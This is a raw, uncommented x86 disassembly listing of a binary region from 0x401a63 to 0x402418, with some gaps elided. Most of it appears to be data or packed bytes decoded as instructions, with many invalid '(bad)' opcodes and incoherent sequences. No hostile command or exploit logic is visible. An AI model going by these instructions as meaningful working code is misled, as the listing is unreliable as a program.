  401a63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a64:	push   cs
  401a65:	add    BYTE PTR [edi],dl
  401a67:	mov    cs,WORD PTR [esi]
  401a69:	add    BYTE PTR [edi],ah
  401a6b:	mov    cs,WORD PTR [esi]
  401a6d:	add    BYTE PTR [eax],al
  401a6f:	cmp    eax,0x4b00039b
  401a74:	xchg   ebx,eax
  401a75:	add    eax,DWORD PTR [eax]
  401a77:	jnp    0x401a01
  401a79:	add    eax,DWORD PTR [eax]
  401a7b:	imul   eax,DWORD PTR [eax-0x64a0fffd],0x3
  401a82:	add    BYTE PTR [edi],dh
  401a84:	xchg   ebx,eax
  401a85:	add    eax,DWORD PTR [eax]
  401a87:	sub    eax,0xf500038b
  401a8c:	add    BYTE PTR [ebx],0x0
  401a8f:	add    DWORD PTR [eax],eax
	...
  401aad:	add    BYTE PTR [ebx-0x6f2afffd],bl
  401ab3:	add    eax,DWORD PTR [eax]
  401ab5:	out    dx,eax
  401ab6:	mov    BYTE PTR [ebx],al
  401ab8:	add    BYTE PTR [ecx-0x7efffc63],ah
  401abe:	jge    0x401ac3
  401ac0:	add    BYTE PTR [ebp-0x66fffc83],ch
  401ac6:	jge    0x401acb
  401ac8:	add    BYTE PTR [ecx+0x7d],al
  401acb:	add    eax,DWORD PTR [eax]
  401acd:	inc    ebp
  401ace:	popf   
  401acf:	add    eax,DWORD PTR [eax]
  401ad1:	push   edi
  401ad2:	popf   
  401ad3:	add    eax,DWORD PTR [eax]
  401ad5:	jecxz  0x401a74
  401ad7:	add    eax,DWORD PTR [eax]
  401ad9:	retf   
  401ada:	popf   
  401adb:	add    eax,DWORD PTR [eax]
  401add:	mov    edi,0xa300037d
  401ae2:	jge    0x401ae7
  401ae4:	add    ch,bh
  401ae6:	jge    0x401aeb
  401ae8:	add    BYTE PTR [ebx],cl
  401aea:	jl     0x401aef
  401aec:	add    bh,ah
  401aee:	popf   
  401aef:	add    al,BYTE PTR [eax]
  401af1:	cmp    DWORD PTR [edx-0x75f6fffe],edx
  401af7:	add    al,BYTE PTR [eax]
  401af9:	xor    eax,DWORD PTR [edx-0x65aefffe]
  401aff:	add    al,BYTE PTR [eax]
  401b01:	inc    ebx
  401b02:	xchg   edx,eax
  401b03:	add    al,BYTE PTR [eax]
  401b05:	add    BYTE PTR [esi+0x7f],ch
  401b08:	add    eax,DWORD PTR [eax]
  401b0a:	pop    esi
  401b0b:	jg     0x401b10
  401b0d:	add    BYTE PTR [eax+0x37e],cl
	...
  401b2f:	add    BYTE PTR [eax],dh
  401b31:	jg     0x401b36
  401b33:	add    BYTE PTR [eax-0x70],ah
  401b36:	add    eax,DWORD PTR [eax]
  401b38:	cli    
  401b39:	pop    DWORD PTR [ebx]
  401b3b:	add    dl,bh
  401b3d:	pop    DWORD PTR [ebx]
  401b3f:	add    al,ch
  401b41:	xchg   edi,eax
  401b42:	add    eax,DWORD PTR [eax]
  401b44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b45:	add    al,BYTE PTR [eax]
  401b47:	add    BYTE PTR [esi+0x620003b3],dl
  401b4d:	mov    bl,0x3
  401b4f:	add    BYTE PTR [eax-0x4d],ah
  401b52:	add    eax,DWORD PTR [eax]
  401b54:	add    al,BYTE PTR fs:[eax]
  401b57:	add    BYTE PTR [edx+0x2],ch
  401b5a:	add    BYTE PTR [eax-0x7ffffd94],al
  401b60:	jbe    0x401b64
  401b62:	add    BYTE PTR [eax-0x7ffffda3],al
  401b68:	add    al,BYTE PTR fs:[eax]
  401b6b:	add    dh,ah
  401b6d:	mov    dl,0x3
  401b6f:	add    BYTE PTR [eax],dh
  401b71:	mov    cl,0x3
  401b73:	add    BYTE PTR [ecx+esi*4+0x3],bl
  401b77:	add    BYTE PTR [edx+eax*1],ah
  401b7a:	add    BYTE PTR [eax],al
  401b7c:	jp     0x401b2f
  401b7e:	add    eax,DWORD PTR [eax]
  401b80:	cli    
  401b81:	mov    dl,0x3
  401b83:	add    BYTE PTR [edx],ah
  401b85:	add    al,BYTE PTR [eax]
  401b87:	add    BYTE PTR [eax],0xb3
  401b8a:	add    eax,DWORD PTR [eax]
  401b8c:	push   ss
  401b8d:	mov    cl,0x3
  401b8f:	add    dl,bl
  401b91:	mov    dl,0x3
	...
  401baf:	add    BYTE PTR [eax],al
  401bb1:	add    dh,bh
  401bb3:	mov    dl,0x3
  401bb5:	add    BYTE PTR [edx],bl
  401bb7:	mov    ah,0x3
  401bb9:	add    BYTE PTR ds:0xd03b3f9,cl
  401bbf:	xor    esi,DWORD PTR [ebx+eax*1+0x3b41d0d]
  401bc6:	or     eax,0xd03b43f
  401bcb:	inc    ebx
  401bcc:	mov    ah,0x3
  401bce:	or     eax,0xd03b44f
  401bd3:	pop    ecx
  401bd4:	mov    bl,0x3
  401bd6:	or     eax,0xd03b447
  401bdb:	aaa    
  401bdc:	mov    ah,0x3
  401bde:	or     eax,0xd03b40d
  401be3:	in     eax,dx
  401be4:	mov    bl,0x3
  401be6:	or     eax,0xd03b3f9
  401beb:	int    0xb3
  401bed:	add    ecx,DWORD PTR ds:0xd03b3e5
  401bf3:	mov    DWORD PTR [ebx+eax*1+0x39c850d],ebx
  401bfa:	or     eax,0xd039cb1
  401bff:	mov    ds:0x550d039c,eax
  401c04:	pushf  
  401c05:	add    ecx,DWORD PTR ds:0xd0003d7
  401c0b:	inc    ebp
  401c0c:	mov    dl,0x3
  401c0e:	or     eax,0xd0003d7
  401c13:	mov    ebx,0x39a
	...
  401c34:	or     eax,0xd039ab5
  401c39:	popf   
  401c3a:	call   0xd03:0x9b0f0d03
  401c41:	adc    DWORD PTR [ebx-0x651ef2fd],ebx
  401c47:	add    ecx,DWORD PTR ds:0xd039ae5
  401c4d:	sbb    eax,0xd039b
  401c52:	pop    ss
  401c53:	fwait
  401c54:	push   cs
  401c55:	add    BYTE PTR [ecx],cl
  401c57:	fwait
  401c58:	push   cs
  401c59:	add    BYTE PTR [ecx],bh
  401c5b:	fwait
  401c5c:	push   cs
  401c5d:	add    BYTE PTR [edi-0x66],dh
  401c60:	push   cs
  401c61:	add    BYTE PTR [ebx-0x66],dl
  401c64:	push   cs
  401c65:	add    BYTE PTR ds:0x23000e9a,bh
  401c6b:	call   0xe:0x9a17000e
  401c72:	aad    0x9d
  401c74:	push   cs
  401c75:	add    bh,dl
  401c77:	popf   
  401c78:	push   cs
  401c79:	add    bh,ch
  401c7b:	popf   
  401c7c:	push   cs
  401c7d:	add    bh,dh
  401c7f:	popf   
  401c80:	push   cs
  401c81:	add    BYTE PTR ds:0xf9000e9e,cl
  401c87:	popf   
  401c88:	push   cs
  401c89:	add    ch,dh
  401c8b:	popf   
  401c8c:	push   cs
  401c8d:	add    BYTE PTR [edi],dh
  401c8f:	popf   
  401c90:	push   cs
  401c91:	add    BYTE PTR [ebx-0x62],al
  401c94:	push   cs
  401c95:	add    BYTE PTR [edi],al
  401c97:	sahf   
	...
  401cb4:	add    BYTE PTR [eax],al
  401cb6:	push   cs
  401cb7:	add    BYTE PTR ds:0x65000e9e,bl
  401cbd:	sahf   
  401cbe:	push   cs
  401cbf:	add    BYTE PTR [ebx-0x62],bl
  401cc2:	push   cs
  401cc3:	add    BYTE PTR [edi-0x62],bl
  401cc6:	push   cs
  401cc7:	add    BYTE PTR [ecx],bh
  401cc9:	sahf   
  401cca:	push   cs
  401ccb:	add    BYTE PTR [ecx+0x3b000e9e],ch
  401cd1:	sahf   
  401cd2:	push   cs
  401cd3:	add    BYTE PTR [ebp-0x62],al
  401cd6:	push   cs
  401cd7:	add    BYTE PTR [edi-0x62],bl
  401cda:	push   cs
  401cdb:	add    bl,ah
  401cdd:	sahf   
  401cde:	push   cs
  401cdf:	add    cl,ah
  401ce1:	sahf   
  401ce2:	push   cs
  401ce3:	add    BYTE PTR [ecx-0x68],ah
  401ce6:	push   cs
  401ce7:	add    BYTE PTR [eax],al
  401ce9:	popa   
  401cea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ceb:	(bad)  
  401cec:	push   DWORD PTR [edx+eiz*4-0x65710001]
  401cf3:	(bad)  
  401cf4:	(bad)  
  401cf5:	mov    edx,0xa0ffff82
  401cfa:	jp     0x401cfb
  401cfc:	call   esi
  401cfe:	cmp    bh,0xff
  401d01:	retf   0xff7a
  401d04:	push   edx
  401d06:	mov    ds:0xa0a2ffff,al
  401d0b:	(bad)  
  401d0c:	jmp    FWORD PTR [edx-0x68]
  401d0f:	(bad)  
  401d10:	jmp    edx
  401d12:	xchg   ebx,eax
  401d13:	(bad)  
  401d14:	call   edx
  401d16:	mov    edi,edi
  401d18:	(bad)  
  401d19:	mov    esi,0x0
	...
  401d36:	add    BYTE PTR [eax],al
  401d38:	cmp    edi,0xffffffff
  401d3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d3c:	jnp    0x401d3d
  401d3e:	inc    edx
  401d40:	ins    DWORD PTR es:[edi],dx
  401d41:	(bad)  
  401d42:	(bad)  
  401d43:	out    dx,al
  401d44:	lods   al,BYTE PTR ds:[esi]
  401d45:	(bad)  
  401d46:	call   esi
  401d48:	lods   al,BYTE PTR ds:[esi]
  401d49:	(bad)  
  401d4a:	(bad)  
  401d4b:	cli    
  401d4c:	lods   al,BYTE PTR ds:[esi]
  401d4d:	(bad)  
  401d4e:	push   DWORD PTR [esi]
  401d50:	scas   eax,DWORD PTR es:[edi]
  401d51:	(bad)  
  401d52:	dec    DWORD PTR [edx]
  401d54:	scas   eax,DWORD PTR es:[edi]
  401d55:	(bad)  
  401d56:	call   FWORD PTR [esi]
  401d58:	scas   eax,DWORD PTR es:[edi]
  401d59:	(bad)  
  401d5a:	jmp    DWORD PTR [esp+ebp*4-0x1]
  401d5e:	call   FWORD PTR [edx-0x54]
  401d61:	(bad)  
  401d62:	dec    DWORD PTR [eax+0x6c]
  401d65:	(bad)  
  401d66:	jmp    FWORD PTR [edx+0x3affffa6]
  401d6c:	xchg   esi,eax
  401d6d:	(bad)  
  401d6e:	dec    DWORD PTR [edx+0x7affff96]
  401d74:	xchg   bh,bh
  401d76:	jmp    FWORD PTR [esi-0x7a]
  401d79:	(bad)  
  401d7a:	call   esp
  401d7c:	jbe    0x401d7d
  401d7e:	(bad)  
  401d7f:	inc    DWORD PTR [eax-0x79]
  401d82:	add    eax,DWORD PTR [eax]
  401d84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d85:	xchg   BYTE PTR [ebx],al
  401d87:	add    BYTE PTR [esi+0x12000386],dh
  401d8d:	mov    WORD PTR [ebx],es
  401d8f:	add    BYTE PTR [esp+ecx*4],cl
  401d92:	add    eax,DWORD PTR [eax]
  401d94:	fadd   QWORD PTR [esi-0x6201fffd]
  401d9a:	add    eax,DWORD PTR [eax]
	...
  401db8:	add    BYTE PTR [eax],al
  401dba:	or     al,0x9e
  401dbc:	add    eax,DWORD PTR [eax]
  401dbe:	add    al,0x9e
  401dc0:	add    eax,DWORD PTR [eax]
  401dc2:	cli    
  401dc3:	popf   
  401dc4:	add    eax,DWORD PTR [eax]
  401dc6:	neg    BYTE PTR [ebp-0x620bfffd]
  401dcc:	add    eax,DWORD PTR [eax]
  401dce:	jbe    0x401d6d
  401dd0:	add    eax,DWORD PTR [eax]
  401dd2:	rcr    BYTE PTR [ebp-0x7381fffd],cl
  401dd8:	add    eax,DWORD PTR [eax]
  401dda:	mov    WORD PTR [ebx+eax*1+0x38d3000],cs
  401de1:	add    dl,dh
  401de3:	mov    WORD PTR [ebx],es
  401de5:	add    BYTE PTR [edx-0x73],al
  401de8:	add    eax,DWORD PTR [eax]
  401dea:	(bad)  
  401deb:	mov    WORD PTR [ebx],es
  401ded:	add    BYTE PTR [edx],bh
  401def:	lea    eax,[ebx]
  401df1:	add    BYTE PTR [eax-0x75],cl
  401df4:	add    eax,DWORD PTR [eax]
  401df6:	dec    esp
  401df7:	mov    eax,DWORD PTR [ebx]
  401df9:	add    BYTE PTR [edx+0x6200039d],al
  401dff:	lahf   
  401e00:	add    eax,DWORD PTR [eax]
  401e02:	push   esp
  401e03:	lahf   
  401e04:	add    eax,DWORD PTR [eax]
  401e06:	jl     0x401da7
  401e08:	add    eax,DWORD PTR [eax]
  401e0a:	sbb    ah,BYTE PTR [ecx-0x60b9fffd]
  401e10:	add    eax,DWORD PTR [eax]
  401e12:	dec    eax
  401e13:	lahf   
  401e14:	add    eax,DWORD PTR [eax]
  401e16:	or     eax,0xd03a163
  401e1b:	outs   dx,DWORD PTR ds:[esi]
  401e1c:	mov    eax,ds:0x3
	...
  401e39:	add    BYTE PTR [eax],al
  401e3b:	add    BYTE PTR ds:0xd03a26b,cl
  401e41:	xlat   BYTE PTR ds:[ebx]
  401e42:	add    eax,DWORD PTR [eax]
  401e44:	or     eax,0xd03b213
  401e49:	and    esi,DWORD PTR [edx-0x4dacf2fd]
  401e4f:	add    ecx,DWORD PTR ds:0xd03b265
  401e55:	mov    esi,DWORD PTR [ecx-0x4e64f2fd]
  401e5b:	add    ecx,DWORD PTR ds:0xd03b1af
  401e61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e62:	mov    cl,0x3
  401e64:	or     eax,0xd03b1d1
  401e69:	fbstp  TBYTE PTR [ecx-0x5132f2fd]
  401e6f:	add    ecx,DWORD PTR ds:0xd03ae9b
  401e75:	mov    DWORD PTR [esi-0x5188f2fd],ebp
  401e7b:	add    ecx,DWORD PTR ds:0xd03ae6d
  401e81:	cmp    eax,0x390d03af
  401e86:	scas   eax,DWORD PTR es:[edi]
  401e87:	add    ecx,DWORD PTR ds:0xd03af0b
  401e8d:	fild   QWORD PTR [esi-0x5076f2fd]
  401e93:	add    ecx,DWORD PTR ds:0xd03aee5
  401e99:	ret    
  401e9a:	scas   al,BYTE PTR es:[edi]
  401e9b:	add    ecx,DWORD PTR ds:0x3d7
	...
  401ebd:	add    BYTE PTR ds:0x8d0003fa,cl
  401ec3:	lds    eax,FWORD PTR [ebx]
  401ec5:	add    BYTE PTR [ebp+0xd03b461],cl
  401ecb:	add    dl,bl
  401ecd:	add    ecx,DWORD PTR ds:0xd03e580
  401ed3:	cmp    ch,0x3
  401ed6:	or     eax,0xd03e780
  401edb:	sbb    al,0x3
  401ede:	or     eax,0xd03e480
  401ee3:	and    ch,0xaf
  401ee6:	push   cs
  401ee7:	add    bl,ch
  401ee9:	scas   eax,DWORD PTR es:[edi]
  401eea:	push   cs
  401eeb:	add    BYTE PTR [ebx],bl
  401eed:	mov    ah,0xe
  401eef:	add    BYTE PTR [edi],al
  401ef1:	mov    ah,0xe
  401ef3:	add    BYTE PTR [edi],ah
  401ef5:	mov    ah,0xe
  401ef7:	add    BYTE PTR [ebp-0x4c],cl
  401efa:	push   cs
  401efb:	add    ah,bl
  401efd:	add    ecx,DWORD PTR ds:0xeb45380
  401f03:	add    dh,ch
  401f05:	add    ecx,DWORD PTR ds:0xeb45580
  401f0b:	add    bh,bh
  401f0d:	add    ecx,DWORD PTR ds:0xd045580
  401f13:	cmp    cl,0x3
  401f16:	or     eax,0xd03eb80
  401f1b:	sbb    dh,0x3
  401f1e:	or     eax,0xb33780
	...
  401f3f:	add    BYTE PTR [esi],cl
  401f41:	add    BYTE PTR [ecx],bh
  401f43:	add    al,0xd
  401f45:	sub    dl,0x3
  401f48:	or     eax,0xd03fa80
  401f4d:	sub    ah,0x3
  401f50:	or     eax,0xd03e880
  401f55:	sub    cl,0x3
  401f58:	or     eax,0xeaefd00
  401f5d:	add    bh,bh
  401f5f:	scas   al,BYTE PTR es:[edi]
  401f60:	push   cs
  401f61:	add    BYTE PTR [eax],al
  401f63:	popa   
  401f64:	push   0xfffffffc
  401f66:	call   FWORD PTR [edx+0x62]
  401f69:	cld    
  401f6a:	inc    DWORD PTR [esi-0x6f000386]
  401f70:	jb     0x401f6e
  401f72:	call   FWORD PTR [edx-0x73000396]
  401f78:	(bad)  
  401f79:	cld    
  401f7a:	jmp    FWORD PTR [esi]
  401f7c:	mov    edx,0xb2190003
  401f81:	add    eax,DWORD PTR [eax]
  401f83:	pop    ds
  401f84:	stos   BYTE PTR es:[edi],al
  401f85:	add    eax,DWORD PTR [eax]
  401f87:	dec    ecx
  401f88:	mov    ds:0xba170003,al
  401f8d:	add    eax,DWORD PTR [eax]
  401f8f:	sbb    eax,0x7b0003b2
  401f94:	test   eax,0xee90003
  401f99:	add    BYTE PTR [eax],al
  401f9b:	xchg   ecx,eax
  401f9c:	jl     0x401fa1
  401f9e:	add    BYTE PTR [edi-0x48fffc84],dl
	...
  401fc0:	add    BYTE PTR [eax],al
  401fc2:	jl     0x401fc7
  401fc4:	add    BYTE PTR [ebp+0x100037c],bh
  401fca:	pop    edi
  401fcb:	add    eax,DWORD PTR [eax]
  401fcd:	icebp  
  401fce:	pop    esp
  401fcf:	add    eax,DWORD PTR [eax]
  401fd1:	fbld   TBYTE PTR [ecx+0x3]
  401fd4:	add    ch,al
  401fd6:	pop    ecx
  401fd7:	add    eax,DWORD PTR [eax]
  401fd9:	mov    ch,0xc1
  401fdb:	add    eax,DWORD PTR [eax]
  401fdd:	jmp    0x92401ff0
  401fe2:	lea    ebp,[esi-0x12124fc2]
  401fe8:	dec    esp
  401fe9:	dec    ecx
  401fea:	xor    al,0xe3
  401fec:	out    dx,eax
  401fed:	add    al,0xdf
  401fef:	xchg   BYTE PTR ds:0xa520b14d,bh
  401ff5:	imul   eax,DWORD PTR [ebx],0xd1004fee
  401ffb:	cli    
  401ffc:	adc    eax,0xafc0f773
  402001:	push   ss
  402002:	cmp    ebp,DWORD PTR ds:0x18b1ac1
  402008:	pop    ebp
  402009:	dec    esi
  40200a:	mov    esp,DWORD PTR [edi]
  40200c:	cs mov cl,0x92
  40200f:	dec    esp
  402010:	cwde   
  402011:	mov    bh,0x28
  402013:	xlat   BYTE PTR ds:[ebx]
  402014:	mov    esi,ebx
  402016:	addr16 clc 
  402018:	icebp  
  402019:	inc    edx
  40201a:	add    BYTE PTR [bx-0x22],ah
  40201e:	dec    DWORD PTR [edx]
  402020:	cld    
  402021:	and    esi,DWORD PTR [ebx-0x80]
  402024:	ins    BYTE PTR es:[edi],dx
  402025:	pop    esi
	...
  402042:	add    BYTE PTR [eax],al
  402044:	push   es
  402045:	out    dx,al
  402046:	pop    edi
  402047:	inc    edi
  402048:	mov    ds,esp
  40204a:	jmp    0x6573:0x7194db33
  402051:	sahf   
  402052:	xor    ebp,DWORD PTR [ecx]
  402054:	mov    edx,0x611d259
  402059:	in     eax,dx
  40205a:	(bad)  
  40205b:	mov    edi,0x603e7a73
  402060:	pop    ecx
  402061:	sahf   
  402062:	xor    ebp,DWORD PTR [ecx]
  402064:	jp     0x4020bf
  402066:	rcl    BYTE PTR [ecx],cl
  402068:	xchg   ch,ch
  40206a:	(bad)  
  40206b:	mov    edi,0x603e73f3
  402070:	imul   BYTE PTR [edi+eax*1-0xb]
  402074:	aad    0xa6
  402076:	rcl    DWORD PTR [ecx],cl
  402078:	std    
  402079:	call   0x21e1:0xfc4c0000
  402080:	test   BYTE PTR [eax],bl
  402082:	dec    eax
  402083:	loopne 0x402028
  402085:	and    al,0x9c
  402087:	dec    ebp
  402088:	fidiv  DWORD PTR [ebp-0x4d5bbe89]
  40208e:	xchg   ebp,eax
  40208f:	test   DWORD PTR ds:0x5a897a84,0xd332ba9c
  402099:	cmp    bl,al
  40209b:	fimul  DWORD PTR [ebx]
  40209d:	jl     0x4020b2
  40209f:	sbb    bh,BYTE PTR [edi]
  4020a1:	xchg   esi,eax
  4020a2:	aas    
  4020a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020a4:	add    DWORD PTR [ebp*1+0x6c],esp
	...
  4020c3:	add    BYTE PTR [eax],al
  4020c5:	add    bh,dl
  4020c7:	popf   
  4020c8:	xchg   edx,eax
  4020c9:	lahf   
  4020ca:	fwait
  4020cb:	call   0x9a609ecd
  4020d0:	fimul  DWORD PTR [ebp+ebx*8+0xf]
  4020d4:	push   esi
  4020d5:	fmul   DWORD PTR [ebp+0x43]
  4020d8:	sub    bh,BYTE PTR [ecx-0x6407e4e2]
  4020de:	loope  0x40212f
  4020e0:	daa    
  4020e1:	push   ebp
  4020e2:	mov    al,ds:0x524ac668
  4020e7:	ins    DWORD PTR es:[edi],dx
  4020e8:	or     eax,0x6eb711fc
  4020ed:	mov    bh,0x15
  4020ef:	sub    al,0x1d
  4020f1:	fstp   QWORD PTR [ebp+0x34]
  4020f4:	dec    eax
  4020f5:	call   0x24345e4d
  4020fa:	jnp    0x402126
  4020fc:	sub    BYTE PTR ds:[edx+0x3c65bc42],cl
  402103:	pop    edi
  402104:	xchg   ebp,eax
  402105:	mov    ebp,0x53e6554f
  40210a:	std    
  40210b:	mov    bl,BYTE PTR [ebx]
  40210d:	pop    edx
  40210e:	bswap  ebp
  402110:	(bad)  
  402111:	rcl    DWORD PTR [ebx],0xdc
  402114:	jae    0x4020e7
  402116:	sbb    al,0x8c
  402118:	xchg   ebx,eax
  402119:	add    BYTE PTR [ebp+0x16],cl
  40211c:	int3   
  40211d:	std    
  40211e:	jp     0x402178
  402120:	popf   
  402121:	adc    dl,BYTE PTR [ecx+0x16]
  402124:	jno    0x4020f5
  402126:	cld    
  402127:	push   DWORD PTR [eax+0x36]
	...
  402146:	add    BYTE PTR [eax],al
  402148:	or     eax,0x2b38e99a
  40214d:	sbb    al,0x73
  40214f:	daa    
  402150:	sbb    BYTE PTR [edi],dh
  402152:	add    dl,BYTE PTR [ebx+0x5c]
  402155:	xorps  xmm3,XMMWORD PTR [ebp-0x51d13ff3]
  40215c:	test   DWORD PTR [eax],esp
  40215e:	imul   ebx,DWORD PTR [ebp+0x70eec41f],0x36710f5a
  402168:	or     eax,0xeb38e99a
  40216d:	sbb    esi,DWORD PTR [eax-0x39]
  402170:	mov    ebx,0xda815d8a
  402175:	push   cs
  402176:	mov    ah,BYTE PTR [ebp+0xd]
  402179:	call   0x9d6e:0xbd4d31e9
  402180:	pop    ds
  402181:	les    ebp,FWORD PTR [esi+0x710eda70]
  402187:	ss or  eax,0x2b38e99a
  40218d:	sbb    al,0xe8
  40218f:	imul   ecx,DWORD PTR [eax-0x258f979d],0xe
  402196:	jno    0x4021ce
  402198:	or     eax,0xeb38e99a
  40219d:	sbb    ecx,DWORD PTR [eax]
  40219f:	cmp    al,0x34
  4021a1:	add    bh,BYTE PTR [eax-0x75f12434]
  4021a7:	cmp    ecx,DWORD PTR ds:0x3e900
	...
  4021c9:	add    BYTE PTR ds:0x61aa5bff,cl
  4021cf:	cmp    ecx,ebp
  4021d1:	in     al,dx
  4021d2:	pop    ebp
  4021d3:	push   cs
  4021d4:	mov    DWORD PTR [eax+0xd],esp
  4021d7:	shr    BYTE PTR [esi],0x9a
  4021da:	test   DWORD PTR [edi],ebx
  4021dc:	add    BYTE PTR ds:0xad4493a7,bh
  4021e2:	jns    0x4021b3
  4021e4:	adc    DWORD PTR [ecx-0x13],ecx
  4021e7:	(bad)  
  4021e8:	mov    edi,0x2077772e
  4021ed:	gs jae 0x4021d9
  4021f0:	sbb    al,0xca
  4021f2:	inc    ebp
  4021f3:	iret   
  4021f4:	adc    DWORD PTR [eax+eiz*8-0x1],edx
  4021f8:	mov    edi,0xffe2792e
  4021fd:	in     eax,dx
  4021fe:	lea    esi,[eax+0x31]
  402201:	clc    
  402202:	add    ch,ah
  402204:	dec    esp
  402205:	sub    DWORD PTR [ebp+0x27b3a44c],0x6
  40220c:	push   esi
  40220d:	xchg   ebp,eax
  40220e:	sub    BYTE PTR [ebx+ebp*8+0x1a],bh
  402212:	and    ecx,esi
  402214:	adc    DWORD PTR [edi-0x513fff30],edx
  40221a:	xchg   esp,eax
  40221b:	js     0x40223d
  40221d:	sbb    eax,DWORD PTR cs:[edx-0x31529d3c]
  402224:	adc    DWORD PTR [ebp+eiz*4+0x0],ebp
  402228:	adc    bl,al
  40222a:	movq   QWORD PTR [esp+ebp*1],mm0
	...
  40224a:	add    BYTE PTR [eax],al
  40224c:	iret   
  40224d:	dec    ecx
  40224e:	mov    ds:0x482cb6fa,eax
  402253:	jae    0x402248
  402255:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402256:	jg     0x402234
  402258:	push   edi
  402259:	gs jbe 0x4022ac
  40225c:	in     eax,dx
  40225d:	sub    al,0x49
  40225f:	and    cl,0xd0
  402262:	adc    DWORD PTR [edi+0x2ec00074],edx
  402268:	ja     0x4022e2
  40226a:	and    BYTE PTR [ecx-0x38],ah
  40226d:	std    
  40226e:	es jg  0x40225a
  402271:	int    0x11
  402273:	add    BYTE PTR [edi],al
  402275:	aaa    
  402276:	add    BYTE PTR [eax],dl
  402278:	inc    DWORD PTR cs:[eax+0x3502d677]
  40227f:	dec    ecx
  402280:	iret   
  402281:	sub    al,0xd1
  402283:	adc    DWORD PTR [edx+0x2bc00098],edi
  402289:	xchg   BYTE PTR [eax-0x6f38aae0],cl
  40228f:	inc    ebp
  402290:	pop    esi
  402291:	add    al,dl
  402293:	adc    DWORD PTR [ebp+0x24a9fffd],edi
  402299:	xor    ch,BYTE PTR [esi]
  40229b:	and    al,0xdc
  40229d:	pop    eax
  40229e:	dec    ebx
  40229f:	addr16 (bad) 
  4022a1:	lock rcl BYTE PTR [ecx],1
  4022a4:	jns    0x4022f2
  4022a6:	add    al,al
  4022a8:	imul   esp,DWORD PTR [edi+0x1c0cfffd],0xffffffbd
  4022af:	dec    ecx
	...
  4022cc:	add    BYTE PTR [eax],al
  4022ce:	pop    ss
  4022cf:	jmp    0x43d934a4
  4022d4:	add    al,al
  4022d6:	stos   DWORD PTR es:[edi],eax
  4022d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022d8:	std    
  4022d9:	jmp    DWORD PTR [edx+0xf]
  4022dc:	gs call 0xc441:0x11d1e58b
  4022e4:	add    BYTE PTR [eax],dl
  4022e6:	lahf   
  4022e7:	dec    esi
  4022e8:	ds std 
  4022ea:	xchg   ebx,eax
  4022eb:	gs scas eax,DWORD PTR es:[edi]
  4022ed:	ins    DWORD PTR es:[edi],dx
  4022ee:	jecxz  0x402320
  4022f0:	rcl    BYTE PTR [ecx],cl
  4022f2:	pop    edx
  4022f3:	mov    ah,0x0
  4022f5:	shr    BYTE PTR [ebx-0x78],0x88
  4022f9:	and    cl,bh
  4022fb:	fild   DWORD PTR [edi-0x2df39815]
  402301:	adc    DWORD PTR [edx-0x4a],edi
  402304:	add    al,al
  402306:	jmp    0x40228d
  402308:	mov    BYTE PTR [eax],ah
  40230a:	or     eax,0x519e1693
  40230f:	pop    ebp
  402310:	mov    al,ds:0xb8541cd2
  402315:	add    BYTE PTR ds:0x983011f,bl
  40231b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40231c:	push   0x15
  40231e:	push   edx
  40231f:	mov    dl,0x39
  402321:	sar    esp,1
  402323:	dec    ebx
  402324:	mov    DWORD PTR [eax],eax
  402326:	dec    ebp
  402327:	adc    DWORD PTR [ebp+edi*8+0x1c376b52],edi
  40232e:	cwde   
  40232f:	mov    BYTE PTR [eax+0xb3],cl
	...
  40234d:	add    BYTE PTR [eax],al
  40234f:	add    dh,dl
  402351:	xor    DWORD PTR [edi+0x3e157256],esi
  402357:	fwait
  402358:	imul   ebp,DWORD PTR [edi-0x1],0xffffffb2
  40235c:	(bad)  
  40235d:	retf   
  40235e:	mov    dh,0xd3
  402360:	cld    
  402361:	ja     0x402363
  402363:	add    ch,bh
  402365:	mov    esi,0xeb75100
  40236a:	mov    WORD PTR [edi-0x2c31d536],?
  402370:	sbb    al,0x78
  402372:	std    
  402373:	dec    DWORD PTR [edx]
  402375:	popf   
  402376:	add    BYTE PTR [ecx+0x57],dl
  402379:	cdq    
  40237a:	js     0x40232b
  40237c:	js     0x402368
  40237e:	xor    edx,edx
  402380:	cld    
  402381:	dec    eax
  402382:	retf   
  402383:	add    ch,cl
  402385:	xchg   edx,eax
  402386:	cdq    
  402387:	mov    BYTE PTR ds:0xd0003d7,ch
  40238d:	xlat   BYTE PTR ds:[ebx]
  40238e:	add    eax,DWORD PTR [eax]
  402390:	or     eax,0xd42fe67
  402395:	fild   DWORD PTR [ebx]
  402397:	add    al,0xd
  402399:	fild   WORD PTR [ebx]
  40239b:	add    al,0xd
  40239d:	xlat   BYTE PTR ds:[ebx]
  40239e:	add    BYTE PTR [ebx+0xd],al
  4023a1:	add    ch,ch
  4023a3:	add    edx,DWORD PTR [eax]
  4023a5:	add    cl,bh
  4023a7:	add    eax,DWORD PTR ds:0xce00e900
  4023ad:	jmp    esp
  4023af:	add    ecx,DWORD PTR [ebx]
  4023b1:	add    BYTE PTR [ecx],cl
  4023b3:	add    al,0x0
	...
  4023d1:	add    BYTE PTR ds:0xce00e900,ch
  4023d7:	(bad)  
  4023d8:	in     al,dx
  4023d9:	add    edx,DWORD PTR [ecx]
  4023db:	add    cl,bl
  4023dd:	add    edi,ebp
  4023df:	(bad)  
  4023e0:	fsub   DWORD PTR ds:0x3f0ffce
  4023e6:	std    
  4023e7:	dec    eax
  4023e9:	add    ebp,ebp
  4023eb:	(bad)  
  4023ec:	fsub   DWORD PTR ds:0x3f0ffce
  4023f2:	sbb    eax,0x8d036900
  4023f7:	add    BYTE PTR [ecx-0x1f0031db],bh
  4023fd:	add    ebp,ebp
  4023ff:	jmp    FWORD PTR [eax+0x3]
  402402:	or     eax,0xce2618ff
  402407:	dec    DWORD PTR [eax]
  402409:	add    al,0x8d
  40240b:	(bad)  
  40240c:	jmp    0x4e25:0xf8fc0d02
  402413:	add    BYTE PTR [ecx],cl
  402415:	add    al,0xf
  402417:	(bad)  
  402418:	jmp    0x4e25:0xf9100d02
